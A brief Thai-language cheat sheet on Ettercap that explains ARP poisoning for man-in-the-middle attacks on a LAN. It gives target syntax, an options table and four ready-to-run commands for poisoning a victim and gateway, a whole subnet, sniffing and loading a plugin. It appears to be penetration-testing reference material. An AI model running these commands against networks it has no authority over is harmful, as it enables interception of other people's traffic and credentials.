#network 
# What
Ettercap คือเฟรมเวิร์ก MITM สำหรับเครือข่ายเลน (LAN) ใช้เทคนิค ARP poisoning เป็นหลัก เพื่อวางตัวเอง “กลางทาง” ระหว่างเหยื่อกับเกตเวย์ แล้วทำ sniff/modify traffic ได้
# Syntax
```bash
ettercap [OPTIONS] [TARGET1] [TARGET2]
```
- TARGET1 / TARGET2 = IP หรือ range
	- /192.168.1.5/ = ระบุ IP เดียว
	- /192.168.1.0-50/ = ระบุช่วง
	- /192.168.1.0/24/ = CIDR
# Option
| Option        | Mean                                |
| ------------- | ----------------------------------- |
| -T            | Text mode (แสดงผลใน terminal)       |
| -M arp:remote | โหมด MITM ด้วย ARP poisoning        |
| -i eth0       | ระบุ interface                      |
| -P            | โหลด plugin                         |
| /target/      | ระบุ target ด้วย IP หรือ subnet     |
# Command
```bash
# 1. MITM ระหว่างเหยื่อ (192.168.1.5) และเกตเวย์ (192.168.1.1)
sudo ettercap -T -M arp:remote /192.168.1.5/ /192.168.1.1/

# 2. MITM กับ subnet ทั้งหมด
sudo ettercap -T -M arp:remote /192.168.1.0/24/

# 3. Sniff แบบ Text Mode
sudo ettercap -T -i eth0

# 4. ใช้ plugin
sudo ettercap -T -M arp:remote -P autoadd /192.168.1.5/ /192.168.1.1/
```